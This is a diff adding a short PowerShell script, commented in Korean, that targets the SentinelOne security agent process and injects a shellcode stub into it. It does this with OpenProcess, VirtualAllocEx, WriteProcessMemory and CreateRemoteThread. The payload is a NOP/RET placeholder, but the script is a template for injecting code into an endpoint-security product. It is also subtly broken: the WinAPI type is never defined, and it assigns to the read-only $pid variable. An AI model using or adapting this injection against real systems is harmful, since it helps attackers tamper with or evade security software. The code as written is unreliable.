@@ -1,0 +1,25 @@
+# 공격 대상 프로세스 (SentinelOne 프로세스 ID 구하기)
+$proc = Get-Process | Where-Object { $_.ProcessName -eq "SentinelAgent" }
+$pid = $proc.Id
+
+# Windows API 불러오기
+$PROCESS_ALL_ACCESS = 0x1F0FFF
+$MEM_COMMIT = 0x1000
+$PAGE_EXECUTE_READWRITE = 0x40
+
+# Shellcode (NOP + RET)
+$payload = [byte[]] (0x90, 0x90, 0xC3)
+
+# 프로세스 핸들 열기
+$hProcess = [WinAPI]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)
+
+# 원격 메모리 할당
+$mem = [WinAPI]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 1024, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
+
+# 원격 프로세스에 페이로드 쓰기
+$written = 0
+[WinAPI]::WriteProcessMemory($hProcess, $mem, $payload, $payload.Length, [ref]$written)
+
+# 원격 쓰레드 생성하여 페이로드 실행
+$threadId = 0
+[WinAPI]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [ref]$threadId)
